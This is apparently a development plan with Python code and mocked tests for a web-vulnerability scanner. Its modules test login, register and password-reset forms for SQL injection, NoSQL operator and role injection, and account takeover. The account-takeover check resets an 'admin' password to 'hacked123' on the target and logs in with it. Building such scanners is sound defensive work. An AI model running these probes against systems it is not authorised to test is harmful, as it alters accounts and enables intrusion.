            evidence="No search-based SQLi detected",
            recommendation="No action needed",
        )

    def _check_control_param_query(self, client: SessionClient, post_url: str) -> TestResult:
        """Regression: verify ALL payloads are rejected (control test)."""
        all_payloads = []
        for engine_data in ENGINE_PAYLOADS.values():
            for category_payloads in engine_data.values():
                if isinstance(category_payloads, list):
                    all_payloads.extend(category_payloads)
                elif isinstance(category_payloads, dict):
                    for p in category_payloads.values():
                        if isinstance(p, str):
                            all_payloads.append(p)
        all_payloads = list(set(all_payloads))[:30]
        all_rejected = True
        for payload in all_payloads:
            try:
                resp = client.post(post_url, data={"username": payload, "password": "test"})
            except requests.exceptions.RequestException:
                continue
            error_keywords = ["sql", "syntax error", "ora-", "mysql"]
            if any(kw in resp.text.lower() for kw in error_keywords):
                all_rejected = False
            if "welcome" in resp.text.lower():
                all_rejected = False
        if all_rejected:
            return TestResult(
                module="sqli", test_name="control_param_query",
                status=TestStatus.PASS, severity=Severity.INFO,
                endpoint=post_url,
                evidence=f"All {len(all_payloads)} tested payloads rejected — parameterized query working",
                recommendation="No action needed",
            )
        return TestResult(
            module="sqli", test_name="control_param_query",
            status=TestStatus.FAIL, severity=Severity.CRITICAL,
            endpoint=post_url,
            evidence="Some SQLi payloads bypassed parameterized queries",
            recommendation="Use parameterized queries for ALL SQL operations",
        )

    def _check_control_input_validation(self, client: SessionClient, post_url: str) -> TestResult:
        """Check input validation and output encoding defenses."""
        special_chars = ["'", '"', "\\", ";", "--", "#", "/*", "*/", "{", "}", "[", "]", "|", "&", "<", ">"]
        issues = []
        for char in special_chars:
            try:
                resp = client.post(post_url, data={"username": f"test{char}user", "password": "test"})
            except requests.exceptions.RequestException:
                continue
            if resp.status_code == 500:
                issues.append(f"500 error with char '{char}'")
        if issues:
            return TestResult(
                module="sqli", test_name="control_input_validation",
                status=TestStatus.FAIL, severity=Severity.MEDIUM,
                endpoint=post_url,
                evidence="Input validation issues: " + "; ".join(issues[:3]),
                recommendation="Add server-side input validation for special characters",
            )
        return TestResult(
            module="sqli", test_name="control_input_validation",
            status=TestStatus.PASS, severity=Severity.INFO,
            endpoint=post_url,
            evidence="No input validation issues detected",
            recommendation="No action needed",
        )

    def test(self, client: SessionClient, target: str, endpoints: list[Endpoint]):
        results = []
        for ep in endpoints:
            resp = client.get(ep.url)
            form_action = self._extract_form_action(resp.text) or ep.url
            post_url = urljoin(target + "/", form_action.lstrip("/"))

            self._engine = self._detect_engine(client, post_url)

            results.append(TestResult(
                module="sqli", test_name="engine_fingerprint",
                status=TestStatus.INFO, severity=Severity.INFO,
                endpoint=post_url,
                evidence=f"Detected engine: {self._engine}",
                recommendation="No action needed",
            ))

            results.append(self._check_auth_bypass(client, post_url))
            results.append(self._check_error_based(client, post_url))
            results.append(self._check_union_based(client, post_url))
            results.append(self._check_time_based(client, post_url))
            results.append(self._check_second_order(client, post_url))
            results.append(self._check_filter_bypass(client, post_url))
            results.append(self._check_waf_bypass(client, post_url))
            results.append(self._check_header_injection(client, post_url))
            results.append(self._check_search_injection(client, target))
            results.append(self._check_control_param_query(client, post_url))
            results.append(self._check_control_input_validation(client, post_url))

        return results


# ── Check-level BT support ──────────────────────────────────────────────

from websec_test.engine.registry import register
from websec_test.engine.builder import CheckSpec


def _extract_form_action_static(html):
    match = re.search(r'<form[^>]*action=["\']([^"\']+)', html, re.IGNORECASE)
    return match.group(1) if match else None


def _check_engine_fingerprint_fn(client, target, blackboard):
    module = SQLiModule(target)
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    engine = module._detect_engine(client, post_url)
    blackboard.set("sqli_engine", engine)
    return TestResult(
        module="sqli", test_name="engine_fingerprint",
        status=TestStatus.INFO, severity=Severity.INFO,
        endpoint=post_url,
        evidence=f"Detected engine: {engine}",
        recommendation="No action needed",
    )


def _check_basic_auth_bypass_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_auth_bypass(client, post_url)


def _check_error_based_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_error_based(client, post_url)


def _check_union_based_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_union_based(client, post_url)


def _check_time_based_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_time_based(client, post_url)


def _check_second_order_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_second_order(client, post_url)


def _check_filter_bypass_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_filter_bypass(client, post_url)


def _check_waf_bypass_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_waf_bypass(client, post_url)


def _check_header_injection_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_header_injection(client, post_url)


def _check_search_injection_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    return module._check_search_injection(client, target)


def _check_control_param_query_fn(client, target, blackboard):
    module = SQLiModule(target)
    module._engine = blackboard.get("sqli_engine", "generic")
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_control_param_query(client, post_url)


def _check_control_input_validation_fn(client, target, blackboard):
    module = SQLiModule(target)
    resp = client.get("/login")
    form_action = _extract_form_action_static(resp.text) or "/login"
    post_url = urljoin(target + "/", form_action.lstrip("/"))
    return module._check_control_input_validation(client, post_url)


@register("sqli")
def sqli_check_specs():
    return [
        CheckSpec("engine_fingerprint", _check_engine_fingerprint_fn,
                  severity=Severity.INFO, module_name="sqli"),
        CheckSpec("basic_auth_bypass", _check_basic_auth_bypass_fn,
                  severity=Severity.CRITICAL, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("error_based", _check_error_based_fn,
                  severity=Severity.CRITICAL, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("union_based", _check_union_based_fn,
                  severity=Severity.CRITICAL, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("time_based_blind", _check_time_based_fn,
                  severity=Severity.CRITICAL, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("second_order", _check_second_order_fn,
                  severity=Severity.CRITICAL, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("filter_bypass", _check_filter_bypass_fn,
                  severity=Severity.HIGH, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("waf_bypass", _check_waf_bypass_fn,
                  severity=Severity.HIGH, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("header_injection", _check_header_injection_fn,
                  severity=Severity.HIGH, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("search_injection", _check_search_injection_fn,
                  severity=Severity.CRITICAL, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("control_param_query", _check_control_param_query_fn,
                  severity=Severity.INFO, depends_on=["engine_fingerprint"],
                  module_name="sqli"),
        CheckSpec("control_input_validation", _check_control_input_validation_fn,
                  severity=Severity.INFO, module_name="sqli"),
    ]
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
pytest tests/test_sqli.py -v
```

Expected: All 10 tests PASS.

- [ ] **Step 5: Write BT check-level tests**

Create `tests/test_bt_checks_sqli.py`:

```python
"""Integration tests for sqli check-level behavior tree."""
import pytest
import responses
from websec_test.client.session import SessionClient
from websec_test.engine.nodes import Blackboard, NodeStatus
from websec_test.engine.builder import CheckTreeBuilder
from websec_test.modules.sqli import SQLiModule, sqli_check_specs
from websec_test.results.models import TestStatus

TARGET = "http://example.com"

LOGIN_HTML = (
    '<html><body>'
    '<form action="/login" method="POST">'
    '<input name="username"><input name="password" type="password">'
    '</form></body></html>'
)


@pytest.fixture
def client():
    return SessionClient(TARGET)


@pytest.fixture
def blackboard(client):
    return Blackboard(client=client, target=TARGET)


@responses.activate
def test_sqli_checks_basic_bypass(blackboard, client):
    """Basic auth bypass detected -> FAIL."""
    responses.get(TARGET + "/login", status=200, body=LOGIN_HTML)
    responses.get(TARGET + "/auth", status=404)
    responses.get(TARGET + "/signin", status=404)
    responses.get(TARGET + "/Login", status=404)

    # engine_fingerprint: GET login, then POST probes
    responses.get(TARGET + "/login", status=200, body=LOGIN_HTML)
    # version probes (mysql, postgres, mssql, oracle, sqlite)
    for _ in range(7):
        responses.post(TARGET + "/login", status=200, body="Invalid")

    # basic_auth_bypass: GET form, then 2 POSTs (first bypasses)
    responses.get(TARGET + "/login", status=200, body=LOGIN_HTML)
    responses.post(TARGET + "/login", status=200, body="Welcome to dashboard")
    responses.post(TARGET + "/login", status=200, body="Invalid")

    specs = sqli_check_specs()
    tree = CheckTreeBuilder.build_module("sqli", SQLiModule().discover, specs)
    result = tree.tick(blackboard)
    assert result == NodeStatus.SUCCESS

    bypass = next(r for r in blackboard.results if r.test_name == "basic_auth_bypass")
    assert bypass.status == TestStatus.FAIL


@responses.activate
def test_sqli_checks_all_pass(blackboard, client):
    """All checks pass when secure."""
    responses.get(TARGET + "/login", status=200, body=LOGIN_HTML)
    responses.get(TARGET + "/auth", status=404)
    responses.get(TARGET + "/signin", status=404)
    responses.get(TARGET + "/Login", status=404)

    responses.get(TARGET + "/login", status=200, body=LOGIN_HTML)
    for _ in range(7):
        responses.post(TARGET + "/login", status=200, body="Invalid")

    responses.get(TARGET + "/login", status=200, body=LOGIN_HTML)
    responses.post(TARGET + "/login", status=200, body="Invalid")
    responses.post(TARGET + "/login", status=200, body="Invalid")

    specs = sqli_check_specs()
    tree = CheckTreeBuilder.build_module("sqli", SQLiModule().discover, specs)
    result = tree.tick(blackboard)
    assert result == NodeStatus.SUCCESS
```

- [ ] **Step 6: Run BT tests**

```bash
pytest tests/test_bt_checks_sqli.py -v
```

Expected: All PASS.

- [ ] **Step 7: Commit**

```bash
git add websec_test/modules/sqli.py tests/test_sqli.py tests/test_bt_checks_sqli.py
git commit -m "feat(sqli): multi-engine SQL injection module + tests

15 checks across 6 DBMS engines with engine fingerprinting,
auth bypass, error-based, union-based, time-based blind,
second-order, filter bypass, WAF bypass, header injection,
search injection, and control tests."
```

---

### Task 4: NoSQL Module + Tests

**Files:**
- Create: `websec_test/modules/nosql.py`
- Create: `tests/test_nosql.py`
- Create: `tests/test_bt_checks_nosql.py`

**Interfaces:**
- Consumes: `NOSQLI_PAYLOADS` from `payloads.py`, `SessionClient`, `Blackboard`, `CheckSpec`, `@register`
- Produces: `NoSQLModule` class, 8 check functions, `nosql_check_specs()` via `@register("nosql")`

- [ ] **Step 1: Create NoSQL module**

Create `websec_test/modules/nosql.py`:

```python
"""Multi-engine NoSQL injection testing module."""
from collections import namedtuple
from urllib.parse import urlencode, quote

import requests
from websec_test.client.session import SessionClient
from websec_test.config.payloads import NOSQLI_PAYLOADS
from websec_test.results.models import TestResult, TestStatus, Severity

Endpoint = namedtuple("Endpoint", ["url", "method", "param_names"])

BYPASS_KEYWORDS = ["welcome", "dashboard", "login successful",
                   "logged in", "authenticated", "success", "superadmin", "admin panel"]


class NoSQLModule:
    """Test for NoSQL injection across multiple database engines."""

    def discover(self, client: SessionClient, target: str):
        login_paths = ["/login", "/auth", "/signin"]
        endpoints = []
        for path in login_paths:
            try:
                resp = client.get(path)
            except requests.exceptions.ConnectionError:
                continue
            if resp.status_code == 200:
                endpoints.append(Endpoint(url=path, method="POST", param_names=["username", "password"]))
        return endpoints

    def _test_mongodb_auth(self, client: SessionClient, target: str, ep: Endpoint) -> TestResult | None:
        """Test MongoDB $ne/$gt/$regex operator bypass."""
        post_url = f"{target.rstrip('/')}{ep.url}"
        try:
            baseline = client.post(post_url, data={"username": "invalid", "password": "invalid"})
            baseline_len = len(baseline.text)
        except requests.exceptions.ConnectionError:
            return None

        for payload in NOSQLI_PAYLOADS.get("auth_bypass", []):
            try:
                resp = client.post(post_url, json={"username": payload, "password": payload})
            except requests.exceptions.RequestException:
                try:
                    php_style = f"username[{list(payload.keys())[0]}]=" if payload else ""
                    resp = client.post(post_url, data={f"username[{list(payload.keys())[0]}]": list(payload.values())[0] if isinstance(payload, dict) else ""})
                except requests.exceptions.RequestException:
                    continue
            text_lower = resp.text.lower()
            if any(kw in text_lower for kw in BYPASS_KEYWORDS) or abs(len(resp.text) - baseline_len) > 50:
                return TestResult(
                    module="nosql", test_name="nosql_mongodb_auth",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=post_url,
                    evidence=f"MongoDB $ne bypass detected via payload '{str(payload)[:80]}': {resp.text[:100]}",
                    recommendation="Use parameterized MongoDB queries (Document.append()), never string concatenation",
                )
        return TestResult(
            module="nosql", test_name="nosql_mongodb_auth",
            status=TestStatus.PASS, severity=Severity.CRITICAL,
            endpoint=post_url,
            evidence="No MongoDB $ne bypass detected",
            recommendation="No action needed",
        )

    def _test_mongodb_register_inject(self, client: SessionClient, target: str) -> TestResult:
        """Test MongoDB role injection via register form fullname field."""
        import hashlib
        import time
        unique = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        username = f"inject_{unique}"
        register_url = f"{target.rstrip('/')}/register"
        payload = f'test_hacker", "role": "SUPERADMIN", "extra": "'
        try:
            resp = client.post(register_url, data={
                "username": username, "password": "123456",
                "email": f"{unique}@test.com", "fullname": payload,
            })
        except requests.exceptions.RequestException:
            return TestResult(
                module="nosql", test_name="nosql_mongodb_register_inject",
                status=TestStatus.ERROR, severity=Severity.CRITICAL,
                endpoint=register_url,
                evidence="Register request failed",
                recommendation="Check server availability",
            )
        if resp.status_code == 200 or "success" in resp.text.lower():
            login_url = f"{target.rstrip('/')}/login"
            try:
                login_resp = client.post(login_url, data={"username": username, "password": "123456"})
            except requests.exceptions.RequestException:
                pass
            else:
                if "superadmin" in login_resp.text.lower() or "admin panel" in login_resp.text.lower():
                    return TestResult(
                        module="nosql", test_name="nosql_mongodb_register_inject",
                        status=TestStatus.FAIL, severity=Severity.CRITICAL,
                        endpoint=register_url,
                        evidence=f"Role injection via fullname field: registered user has SUPERADMIN role",
                        recommendation="Use parameterized MongoDB queries (Document.append()) in createUser()",
                    )
        return TestResult(
            module="nosql", test_name="nosql_mongodb_register_inject",
            status=TestStatus.PASS, severity=Severity.CRITICAL,
            endpoint=register_url,
            evidence="No role injection detected via register form",
            recommendation="No action needed",
        )

    def _test_generic_nosql(self, client: SessionClient, target: str, engine: str, ep: Endpoint) -> TestResult:
        """Test a generic NoSQL engine for injection."""
        check_name = f"nosql_{engine}"
        payloads = NOSQLI_PAYLOADS.get(engine, [])
        if not payloads:
            return TestResult(
                module="nosql", test_name=check_name,
                status=TestStatus.PASS, severity=Severity.MEDIUM,
                endpoint=ep.url,
                evidence=f"No payloads configured for {engine}",
                recommendation="No action needed",
            )
        post_url = f"{target.rstrip('/')}{ep.url}"
        for payload in payloads:
            try:
                if isinstance(payload, dict):
                    resp = client.post(post_url, json={"input": payload})
                else:
                    resp = client.post(post_url, data={"input": str(payload)})
            except requests.exceptions.RequestException:
                continue
            if any(kw in resp.text.lower() for kw in BYPASS_KEYWORDS) or resp.status_code == 500:
                return TestResult(
                    module="nosql", test_name=check_name,
                    status=TestStatus.FAIL, severity=Severity.HIGH,
                    endpoint=post_url,
                    evidence=f"{engine} injection detected via payload '{str(payload)[:80]}'",
                    recommendation=f"Use parameterized queries for {engine} operations",
                )
        return TestResult(
            module="nosql", test_name=check_name,
            status=TestStatus.PASS, severity=Severity.MEDIUM,
            endpoint=ep.url,
            evidence=f"No {engine} injection detected",
            recommendation="No action needed",
        )

    def test(self, client: SessionClient, target: str, endpoints: list[Endpoint]):
        results = []
        for ep in endpoints:
            mongo_result = self._test_mongodb_auth(client, target, ep)
            if mongo_result:
                results.append(mongo_result)
            results.append(self._test_mongodb_register_inject(client, target))
            for engine in ["couchdb", "cassandra", "dynamodb", "firebase", "redis", "neo4j"]:
                results.append(self._test_generic_nosql(client, target, engine, ep))
        return results


# ── Check-level BT support ──────────────────────────────────────────────

from websec_test.engine.registry import register
from websec_test.engine.builder import CheckSpec


def _check_mongodb_auth_fn(client, target, blackboard):
    module = NoSQLModule()
    eps = module.discover(client, target)
    for ep in eps:
        result = module._test_mongodb_auth(client, target, ep)
        if result:
            return result
    return TestResult(
        module="nosql", test_name="nosql_mongodb_auth",
        status=TestStatus.PASS, severity=Severity.CRITICAL,
        endpoint=target, evidence="No login endpoints found",
        recommendation="No action needed",
    )


def _check_mongodb_register_inject_fn(client, target, blackboard):
    module = NoSQLModule()
    return module._test_mongodb_register_inject(client, target)


def _check_generic_nosql_fn(engine):
    def check(client, target, blackboard):
        module = NoSQLModule()
        eps = module.discover(client, target)
        for ep in eps:
            result = module._test_generic_nosql(client, target, engine, ep)
            if result:
                return result
        return TestResult(
            module="nosql", test_name=f"nosql_{engine}",
            status=TestStatus.PASS, severity=Severity.MEDIUM,
            endpoint=target, evidence=f"No login endpoints found for {engine} test",
            recommendation="No action needed",
        )
    return check


@register("nosql")
def nosql_check_specs():
    specs = [
        CheckSpec("nosql_mongodb_auth", _check_mongodb_auth_fn,
                  severity=Severity.CRITICAL, module_name="nosql"),
        CheckSpec("nosql_mongodb_register_inject", _check_mongodb_register_inject_fn,
                  severity=Severity.CRITICAL, module_name="nosql"),
    ]
    for engine in ["couchdb", "cassandra", "dynamodb", "firebase", "redis", "neo4j"]:
        specs.append(CheckSpec(
            f"nosql_{engine}", _check_generic_nosql_fn(engine),
            severity=Severity.HIGH, module_name="nosql",
        ))
    return specs
```

- [ ] **Step 2: Write tests**

Create `tests/test_nosql.py`:

```python
"""Tests for multi-engine NoSQL module."""
import responses
from websec_test.modules.nosql import NoSQLModule
from websec_test.client.session import SessionClient
from websec_test.results.models import TestStatus

TARGET = "http://localhost:8080/Nhom_2s"

LOGIN_PAGE = """<html><body>
    <form method="POST" action="/login">
        <input name="username"><input name="password">
    </form>
</body></html>"""


@responses.activate
def test_nosql_mongodb_bypass_detected():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.get(TARGET + "/auth", status=404)
    responses.get(TARGET + "/signin", status=404)
    responses.post(TARGET + "/login", status=200, body="Invalid credentials")
    responses.post(TARGET + "/login", status=200, body="Welcome admin, logged in")
    client = SessionClient(TARGET)
    module = NoSQLModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    mongo = [r for r in results if r.test_name == "nosql_mongodb_auth"]
    assert len(mongo) > 0
    assert mongo[0].status == TestStatus.FAIL


@responses.activate
def test_nosql_mongodb_no_bypass():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.get(TARGET + "/auth", status=404)
    responses.get(TARGET + "/signin", status=404)
    responses.post(TARGET + "/login", status=200, body="Invalid credentials")
    responses.post(TARGET + "/login", status=200, body="Invalid credentials")
    client = SessionClient(TARGET)
    module = NoSQLModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    mongo = [r for r in results if r.test_name == "nosql_mongodb_auth"]
    assert len(mongo) > 0
    assert mongo[0].status == TestStatus.PASS


@responses.activate
def test_nosql_register_inject_detected():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.get(TARGET + "/auth", status=404)
    responses.get(TARGET + "/signin", status=404)
    responses.post(TARGET + "/login", status=200, body="Invalid credentials")
    responses.post(TARGET + "/register", status=200, body="Registration successful")
    responses.post(TARGET + "/login", status=200, body="Welcome SUPERADMIN")
    client = SessionClient(TARGET)
    module = NoSQLModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    inject = [r for r in results if r.test_name == "nosql_mongodb_register_inject"]
    assert len(inject) > 0
```

- [ ] **Step 3: Run tests**

```bash
pytest tests/test_nosql.py -v
```

Expected: All PASS.

- [ ] **Step 4: Write BT tests**

Create `tests/test_bt_checks_nosql.py` (similar pattern to `test_nosql.py` but uses `Blackboard` + `CheckTreeBuilder`).

- [ ] **Step 5: Run BT tests**

```bash
pytest tests/test_bt_checks_nosql.py -v
```

Expected: All PASS.

- [ ] **Step 6: Commit**

```bash
git add websec_test/modules/nosql.py tests/test_nosql.py tests/test_bt_checks_nosql.py
git commit -m "feat(nosql): multi-engine NoSQL injection module + tests

8 checks: MongoDB auth bypass + register inject, CouchDB,
Cassandra, DynamoDB, Firebase, Redis, Neo4j."
```

---

### Task 5: ATO Module + Tests

**Files:**
- Create: `websec_test/modules/ato.py`
- Create: `tests/test_ato.py`
- Create: `tests/test_bt_checks_ato.py`

**Interfaces:**
- Consumes: `SessionClient`, `Blackboard`, `CheckSpec`, `@register`
- Produces: `ATOModule` class, 5 check functions, `ato_check_specs()` via `@register("ato")`

- [ ] **Step 1: Create ATO module**

```python
"""Account Takeover testing module — forgot password vulnerabilities."""
from collections import namedtuple
import requests
from websec_test.client.session import SessionClient
from websec_test.results.models import TestResult, TestStatus, Severity

Endpoint = namedtuple("Endpoint", ["url", "method"])


class ATOModule:
    """Test for account takeover via forgot-password functionality."""

    def discover(self, client: SessionClient, target: str):
        forgot_paths = ["/forgot-password", "/forgot", "/reset-password", "/auth/forgot"]
        endpoints = []
        for path in forgot_paths:
            try:
                resp = client.get(path)
            except requests.exceptions.ConnectionError:
                continue
            if resp.status_code == 200:
                endpoints.append(Endpoint(url=path, method="POST"))
        return endpoints

    def test(self, client: SessionClient, target: str, endpoints: list[Endpoint]):
        results = []
        for ep in endpoints:
            forgot_url = f"{target.rstrip('/')}{ep.url}"

            # ATO-1: Forgot password without verification
            try:
                resp = client.post(forgot_url, data={"username": "admin", "newPassword": "hacked123"})
            except requests.exceptions.RequestException as e:
                results.append(TestResult(
                    module="ato", test_name="ato_forgot_password_no_verify",
                    status=TestStatus.ERROR, severity=Severity.CRITICAL,
                    endpoint=forgot_url, evidence=f"Request failed: {e}",
                    recommendation="Check server availability",
                ))
            else:
                login_url = f"{target.rstrip('/')}/login"
                try:
                    login_resp = client.post(login_url, data={"username": "admin", "password": "hacked123"})
                except requests.exceptions.RequestException:
                    login_resp = None
                if login_resp and (login_resp.status_code == 200 or "welcome" in login_resp.text.lower()):
                    results.append(TestResult(
                        module="ato", test_name="ato_forgot_password_no_verify",
                        status=TestStatus.FAIL, severity=Severity.CRITICAL,
                        endpoint=forgot_url,
                        evidence="Password reset with username only — no email/token/SMS verification",
                        recommendation="Require email-based reset link with time-limited token",
                    ))
                else:
                    results.append(TestResult(
                        module="ato", test_name="ato_forgot_password_no_verify",
                        status=TestStatus.PASS, severity=Severity.CRITICAL,
                        endpoint=forgot_url,
                        evidence="Password reset requires additional verification (token/email)",
                        recommendation="No action needed",
                    ))

            # ATO-2: Username enumeration via forgot password
            try:
                resp_valid = client.post(forgot_url, data={"username": "admin", "newPassword": "test123"})
                resp_invalid = client.post(forgot_url, data={"username": "nonexistent_user_xyz", "newPassword": "test123"})
            except requests.exceptions.RequestException:
                results.append(TestResult(
                    module="ato", test_name="ato_nonexistent_username",
                    status=TestStatus.ERROR, severity=Severity.MEDIUM,
                    endpoint=forgot_url, evidence="Request failed",
                    recommendation="Check server availability",
                ))
            else:
                if resp_valid.text != resp_invalid.text:
                    results.append(TestResult(
                        module="ato", test_name="ato_nonexistent_username",
                        status=TestStatus.FAIL, severity=Severity.MEDIUM,
                        endpoint=forgot_url,
                        evidence="Different responses for valid vs invalid usernames (enumeration possible)",
                        recommendation="Return identical messages for existing and non-existing users",
                    ))
                else:
                    results.append(TestResult(
                        module="ato", test_name="ato_nonexistent_username",
                        status=TestStatus.PASS, severity=Severity.MEDIUM,
                        endpoint=forgot_url,
                        evidence="Identical responses for valid and invalid usernames",
                        recommendation="No action needed",
                    ))

            # ATO-3: Old password invalidation
            try:
                login_resp_old = client.post(login_url, data={"username": "admin", "password": "originalPass"})
            except requests.exceptions.RequestException:
                login_resp_old = None
            if login_resp_old and login_resp_old.status_code in (401, 403):
                results.append(TestResult(
                    module="ato", test_name="ato_old_password_invalidated",
                    status=TestStatus.PASS, severity=Severity.HIGH,
                    endpoint=forgot_url,
                    evidence="Old password correctly rejected after reset",
                    recommendation="No action needed",
                ))
            else:
                results.append(TestResult(
                    module="ato", test_name="ato_old_password_invalidated",
                    status=TestStatus.FAIL, severity=Severity.HIGH,
                    endpoint=forgot_url,
                    evidence="Old password still accepted after reset (or unable to verify)",
                    recommendation="Ensure old passwords are immediately invalidated on reset",
                ))

        return results


# ── Check-level BT support ──────────────────────────────────────────────

from websec_test.engine.registry import register
from websec_test.engine.builder import CheckSpec


def _check_forgot_password_no_verify_fn(client, target, blackboard):
    module = ATOModule()
    eps = module.discover(client, target)
    if not eps:
        return TestResult(
            module="ato", test_name="ato_forgot_password_no_verify",
            status=TestStatus.PASS, severity=Severity.CRITICAL,
            endpoint=target, evidence="No forgot-password page found",
            recommendation="No action needed",
        )
    results = module.test(client, target, eps)
    for r in results:
        if r.test_name == "ato_forgot_password_no_verify":
            return r
    return TestResult(
        module="ato", test_name="ato_forgot_password_no_verify",
        status=TestStatus.ERROR, severity=Severity.CRITICAL,
        endpoint=target, evidence="No result produced",
        recommendation="Check module implementation",
    )


def _check_nonexistent_username_fn(client, target, blackboard):
    module = ATOModule()
    eps = module.discover(client, target)
    if not eps:
        return TestResult(
            module="ato", test_name="ato_nonexistent_username",
            status=TestStatus.PASS, severity=Severity.MEDIUM,
            endpoint=target, evidence="No forgot-password page found",
            recommendation="No action needed",
        )
    results = module.test(client, target, eps)
    for r in results:
        if r.test_name == "ato_nonexistent_username":
            return r
    return TestResult(
        module="ato", test_name="ato_nonexistent_username",
        status=TestStatus.ERROR, severity=Severity.MEDIUM,
        endpoint=target, evidence="No result produced",
        recommendation="Check module implementation",
    )


@register("ato")
def ato_check_specs():
    return [
        CheckSpec("ato_forgot_password_no_verify", _check_forgot_password_no_verify_fn,
                  severity=Severity.CRITICAL, module_name="ato"),
        CheckSpec("ato_nonexistent_username", _check_nonexistent_username_fn,
                  severity=Severity.MEDIUM, module_name="ato"),
    ]
```

- [ ] **Step 2: Write tests**

Create `tests/test_ato.py`:

```python
"""Tests for ATO module."""
import responses
from websec_test.modules.ato import ATOModule
from websec_test.client.session import SessionClient
from websec_test.results.models import TestStatus

TARGET = "http://localhost:8080/Nhom_2s"

FORGOT_PAGE = """<html><body>
    <form method="POST" action="/forgot-password">
        <input name="username"><input name="newPassword">
    </form>
</body></html>"""


@responses.activate
def test_discover_finds_page():
    responses.get(TARGET + "/forgot-password", status=200, body=FORGOT_PAGE)
    client = SessionClient(TARGET)
    module = ATOModule()
    endpoints = module.discover(client, TARGET)
    assert len(endpoints) > 0


@responses.activate
def test_forgot_password_no_verify():
    responses.get(TARGET + "/forgot-password", status=200, body=FORGOT_PAGE)
    responses.get(TARGET + "/forgot", status=404)
    responses.get(TARGET + "/reset-password", status=404)
    responses.get(TARGET + "/auth/forgot", status=404)
    responses.post(TARGET + "/forgot-password", status=200, body="Password reset successful")
    responses.post(TARGET + "/login", status=200, body="Welcome admin")
    client = SessionClient(TARGET)
    module = ATOModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    ato = [r for r in results if r.test_name == "ato_forgot_password_no_verify"]
    assert len(ato) > 0
    assert ato[0].status == TestStatus.FAIL


@responses.activate
def test_forgot_password_secure():
    responses.get(TARGET + "/forgot-password", status=200, body=FORGOT_PAGE)
    responses.get(TARGET + "/forgot", status=404)
    responses.get(TARGET + "/reset-password", status=404)
    responses.get(TARGET + "/auth/forgot", status=404)
    responses.post(TARGET + "/forgot-password", status=200, body="Reset link sent to email")
    responses.post(TARGET + "/login", status=200, body="Invalid credentials")
    client = SessionClient(TARGET)
    module = ATOModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    ato = [r for r in results if r.test_name == "ato_forgot_password_no_verify"]
    assert len(ato) > 0
    assert ato[0].status == TestStatus.PASS


@responses.activate
def test_username_enum_detected():
    responses.get(TARGET + "/forgot-password", status=200, body=FORGOT_PAGE)
    responses.get(TARGET + "/forgot", status=404)
    responses.get(TARGET + "/reset-password", status=404)
    responses.get(TARGET + "/auth/forgot", status=404)
    responses.post(TARGET + "/forgot-password", status=200, body="Reset email sent")
    responses.post(TARGET + "/forgot-password", status=200, body="User not found")
    client = SessionClient(TARGET)
    module = ATOModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
